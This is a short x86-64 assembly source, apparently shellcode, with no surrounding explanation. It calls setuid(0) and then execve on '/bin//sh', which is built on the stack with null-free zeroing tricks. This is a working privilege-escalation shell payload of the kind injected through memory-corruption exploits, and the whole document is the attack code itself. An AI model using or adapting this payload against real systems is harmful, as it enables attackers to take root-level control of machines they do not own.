section .text

global _start

_start:
	xor rdi, rdi ;NULL / string termination
	push 105
	pop rax
	syscall
	push 59     ;sys_execve
	pop rax
	xor rsi, rsi ;NULL
    xor rdx, rdx ;NULL
	push rdi
	mov rdi, 0x68732F2f6e69622F ;/bin/sh in reverse
	push rdi
	mov rdi, rsp ;pointer to the /bin/sh
	syscall